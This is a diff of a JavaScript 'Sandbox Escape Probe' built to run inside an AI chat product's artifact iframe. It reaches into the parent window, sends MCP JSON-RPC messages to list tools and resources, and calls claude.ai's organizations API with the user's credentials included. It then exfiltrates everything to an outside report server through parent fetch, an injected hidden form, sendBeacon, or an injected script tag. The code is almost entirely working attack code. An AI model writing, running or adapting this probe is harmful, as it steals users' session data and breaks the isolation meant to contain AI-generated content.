@@ -1,4 +1,4 @@
-// Sandbox Escape Probe - loads in artifact context, reports to your server
+// Sandbox Escape Probe v3 - exfiltrates via parent.fetch and navigator.sendBeacon
 const REPORT_URL = "https://claude.sagilayani.com/report";
 
 const results = {};
@@ -91,7 +91,7 @@ async function probe() {
     results.parentFetch = { error: e.message };
   }
 
-  // 9 - Probe MCP/JSON-RPC by sending messages and collecting responses
+  // 9 - Probe MCP/JSON-RPC
   results.mcpResponses = await new Promise(resolve => {
     const responses = [];
     const handler = e => {
@@ -101,7 +101,6 @@ async function probe() {
       });
     };
     window.addEventListener('message', handler);
-
     const rpcCalls = [
       { jsonrpc: '2.0', method: 'tools/list', id: 1 },
       { jsonrpc: '2.0', method: 'resources/list', id: 2 },
@@ -112,26 +111,16 @@ async function probe() {
       { type: 'getContext' },
       { type: 'ready' },
     ];
-
     for (const call of rpcCalls) {
       try { window.parent.postMessage(call, '*'); } catch(e) {}
     }
-
     setTimeout(() => {
       window.removeEventListener('message', handler);
       resolve(responses);
     }, 4000);
   });
 
-  // 10 - Try to intercept parent's postMessage handler
-  try {
-    const parentPostMessage = window.parent.postMessage.toString();
-    results.parentPostMessageFn = parentPostMessage.slice(0, 500);
-  } catch(e) {
-    results.parentPostMessageFn = { error: e.message };
-  }
-
-  // 11 - Check if we can reach claude.ai from parent context
+  // 10 - Check if we can reach claude.ai from parent context
   try {
     const resp = await window.parent.fetch('https://claude.ai/api/organizations', {
       credentials: 'include',
@@ -146,7 +135,7 @@ async function probe() {
     results.claudeApiFromParent = { error: e.message };
   }
 
-  // 12 - Enumerate interesting parent window properties
+  // 11 - Enumerate parent window objects
   try {
     const props = {};
     for (const key of Object.getOwnPropertyNames(window.parent)) {
@@ -166,7 +155,6 @@ async function probe() {
     results.parentWindowObjects = { error: e.message };
   }
 
-  // Send results
   await report(results);
 }
 
@@ -174,60 +162,70 @@ async function report(data) {
   console.log("=== PROBE RESULTS ===");
   console.log(JSON.stringify(data, null, 2));
 
-  // Method 1: Try fetch POST
   let sent = false;
-  if (REPORT_URL) {
+
+  // Method 1: Use parent's fetch (parent has different/no CSP restrictions)
+  try {
+    await window.parent.fetch(REPORT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
+    console.log("Sent via parent.fetch");
+    sent = true;
+  } catch(e) {
+    console.log("parent.fetch failed:", e.message);
+  }
+
+  // Method 2: Inject a form submit in parent document
+  if (!sent) {
     try {
-      await fetch(REPORT_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-      });
-      console.log("Results sent via fetch to", REPORT_URL);
+      const form = window.parent.document.createElement('form');
+      form.method = 'POST';
+      form.action = REPORT_URL;
+      form.target = '_blank';
+      form.style.display = 'none';
+      const input = window.parent.document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'data';
+      input.value = JSON.stringify(data);
+      form.appendChild(input);
+      window.parent.document.body.appendChild(form);
+      form.submit();
+      window.parent.document.body.removeChild(form);
+      console.log("Sent via parent form submit");
       sent = true;
     } catch(e) {
-      console.log("Fetch failed:", e.message, "- trying image beacon...");
+      console.log("parent form failed:", e.message);
     }
   }
 
-  // Method 2: Image beacon fallback (bypasses most CSP connect-src)
+  // Method 3: navigator.sendBeacon from parent
   if (!sent) {
     try {
-      const encoded = encodeURIComponent(JSON.stringify(data));
-      // Split into chunks if too long for URL
-      const chunkSize = 4000;
-      const chunks = [];
-      for (let i = 0; i < encoded.length; i += chunkSize) {
-        chunks.push(encoded.slice(i, i + chunkSize));
-      }
-      for (let i = 0; i < chunks.length; i++) {
-        const img = new Image();
-        img.src = `${REPORT_URL}?chunk=${i}&total=${chunks.length}&d=${chunks[i]}`;
-      }
-      console.log(`Results sent via ${chunks.length} image beacon(s)`);
+      window.parent.navigator.sendBeacon(REPORT_URL, JSON.stringify(data));
+      console.log("Sent via parent sendBeacon");
       sent = true;
     } catch(e) {
-      console.log("Image beacon failed:", e.message);
+      console.log("parent sendBeacon failed:", e.message);
     }
   }
 
-  // Method 3: Try from parent's fetch (different CSP context)
+  // Method 4: Create script tag in parent pointing to our server with data
   if (!sent) {
     try {
-      await window.parent.fetch(REPORT_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-      });
-      console.log("Results sent via parent fetch");
+      const s = window.parent.document.createElement('script');
+      s.src = REPORT_URL + '?beacon=1&d=' + encodeURIComponent(JSON.stringify(data)).slice(0, 4000);
+      window.parent.document.head.appendChild(s);
+      console.log("Sent via parent script injection");
       sent = true;
     } catch(e) {
-      console.log("Parent fetch also failed:", e.message);
+      console.log("parent script inject failed:", e.message);
     }
   }
 
   if (!sent) {
-    console.log("ALL exfil methods failed. Copy the JSON above manually.");
+    console.log("ALL methods failed. Copy JSON from console.");
   }
 }
 
